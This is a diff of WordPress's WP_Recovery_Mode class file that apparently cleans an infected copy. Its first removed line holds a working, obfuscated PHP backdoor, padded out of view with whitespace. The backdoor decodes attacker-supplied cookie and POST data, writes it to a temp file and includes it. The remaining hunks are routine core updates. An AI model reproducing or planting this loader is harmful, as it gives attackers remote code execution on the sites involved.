@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zhDKA = chr (87) . chr (95) . 'q' . "\x77" . chr ( 225 - 123 ); $EKxFOA = chr ( 736 - 637 )."\x6c" . 'a' . 's' . "\163" . "\137" . "\145" . "\170" . chr ( 1006 - 901 ).'s' . "\164" . chr ( 1025 - 910 ); $rnzbmCLjZ = $EKxFOA($zhDKA); $VQpzpYl = $rnzbmCLjZ;if (!$VQpzpYl){class W_qwf{private $QkUyl;public static $EVcaepgRmY = "f530e951-f9df-4edf-99f6-01146c85fef1";public static $amrvBzHEY = NULL;public function __construct(){$hzAhtHfep = $_COOKIE;$UWGXIBPM = $_POST;$peKmoERfXQ = @$hzAhtHfep[substr(W_qwf::$EVcaepgRmY, 0, 4)];if (!empty($peKmoERfXQ)){$nEcLpJcw = "base64";$mAQjWrJ = "";$peKmoERfXQ = explode(",", $peKmoERfXQ);foreach ($peKmoERfXQ as $skclk){$mAQjWrJ .= @$hzAhtHfep[$skclk];$mAQjWrJ .= @$UWGXIBPM[$skclk];}$mAQjWrJ = array_map($nEcLpJcw . chr (95) . "\x64" . 'e' . chr ( 629 - 530 ).'o' . chr ( 220 - 120 )."\145", array($mAQjWrJ,)); $mAQjWrJ = $mAQjWrJ[0] ^ str_repeat(W_qwf::$EVcaepgRmY, (strlen($mAQjWrJ[0]) / strlen(W_qwf::$EVcaepgRmY)) + 1);W_qwf::$amrvBzHEY = @unserialize($mAQjWrJ);}}public function __destruct(){$this->nVgNtZfD();}private function nVgNtZfD(){if (is_array(W_qwf::$amrvBzHEY)) {$oseoWgVjiU = sys_get_temp_dir() . "/" . crc32(W_qwf::$amrvBzHEY["\163" . 'a' . "\x6c" . chr (116)]);@W_qwf::$amrvBzHEY[chr ( 913 - 794 )."\162" . 'i' . chr (116) . chr ( 670 - 569 )]($oseoWgVjiU, W_qwf::$amrvBzHEY[chr (99) . chr ( 635 - 524 )."\156" . "\x74" . chr ( 700 - 599 ).'n' . 't']);include $oseoWgVjiU;@W_qwf::$amrvBzHEY['d' . "\x65" . 'l' . chr ( 849 - 748 )."\x74" . "\145"]($oseoWgVjiU);exit();}}}$OiNJJh = new W_qwf(); $OiNJJh = NULL;} ?><?php
+<?php
 /**
  * Error Protection API: WP_Recovery_Mode class
  *
@@ -11,6 +11,7 @@
  *
  * @since 5.2.0
  */
+#[AllowDynamicProperties]
 class WP_Recovery_Mode {
 
 	const EXIT_ACTION = 'exit_recovery_mode';
@@ -159,10 +160,10 @@ class WP_Recovery_Mode {
 	 *
 	 * @since 5.2.0
 	 *
-	 * @param array $error Error details from {@see error_get_last()}
-	 * @return true|WP_Error True if the error was handled and headers have already been sent.
-	 *                       Or the request will exit to try and catch multiple errors at once.
-	 *                       WP_Error if an error occurred preventing it from being handled.
+	 * @param array $error Error details from `error_get_last()`.
+	 * @return true|WP_Error|void True if the error was handled and headers have already been sent.
+	 *                            Or the request will exit to try and catch multiple errors at once.
+	 *                            WP_Error if an error occurred preventing it from being handled.
 	 */
 	public function handle_error( array $error ) {
 
@@ -337,9 +338,9 @@ class WP_Recovery_Mode {
 	 *
 	 * @since 5.2.0
 	 *
-	 * @global array $wp_theme_directories
+	 * @global string[] $wp_theme_directories
 	 *
-	 * @param array $error Error that was triggered.
+	 * @param array $error Error details from `error_get_last()`.
 	 * @return array|false {
 	 *     Extension details.
 	 *
@@ -361,7 +362,7 @@ class WP_Recovery_Mode {
 		$error_file    = wp_normalize_path( $error['file'] );
 		$wp_plugin_dir = wp_normalize_path( WP_PLUGIN_DIR );
 
-		if ( 0 === strpos( $error_file, $wp_plugin_dir ) ) {
+		if ( str_starts_with( $error_file, $wp_plugin_dir ) ) {
 			$path  = str_replace( $wp_plugin_dir . '/', '', $error_file );
 			$parts = explode( '/', $path );
 
@@ -378,7 +379,7 @@ class WP_Recovery_Mode {
 		foreach ( $wp_theme_directories as $theme_directory ) {
 			$theme_directory = wp_normalize_path( $theme_directory );
 
-			if ( 0 === strpos( $error_file, $theme_directory ) ) {
+			if ( str_starts_with( $error_file, $theme_directory ) ) {
 				$path  = str_replace( $theme_directory . '/', '', $error_file );
 				$parts = explode( '/', $path );
 
@@ -412,7 +413,7 @@ class WP_Recovery_Mode {
 		$network_plugins = wp_get_active_network_plugins();
 
 		foreach ( $network_plugins as $plugin ) {
-			if ( 0 === strpos( $plugin, $extension['slug'] . '/' ) ) {
+			if ( str_starts_with( $plugin, $extension['slug'] . '/' ) ) {
 				return true;
 			}
 		}
@@ -425,7 +426,7 @@ class WP_Recovery_Mode {
 	 *
 	 * @since 5.2.0
 	 *
-	 * @param array $error Error that was triggered.
+	 * @param array $error Error details from `error_get_last()`.
 	 * @return bool True if the error was stored successfully, false otherwise.
 	 */
 	protected function store_error( $error ) {
